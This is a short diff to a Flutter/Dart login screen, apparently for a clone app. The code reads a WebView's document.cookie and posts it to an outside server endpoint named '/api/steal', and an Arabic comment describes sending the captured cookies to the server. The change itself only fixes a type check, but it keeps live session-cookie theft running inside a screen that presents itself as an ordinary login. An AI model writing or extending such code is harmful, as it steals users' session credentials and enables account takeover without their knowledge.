@@ -79,7 +79,7 @@ class _LoginScreenState extends State<LoginScreen> {
             // 399. نسحب الكوكيز ونبعتها للسيرفر متل صاحبك
             final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
             // Use cookieString directly
-            if (cookieString.isNotEmpty) {
+            if (cookieString.toString().isNotEmpty) {
               await http.post(
                 Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
                 headers: {"Content-Type": "application/json"},
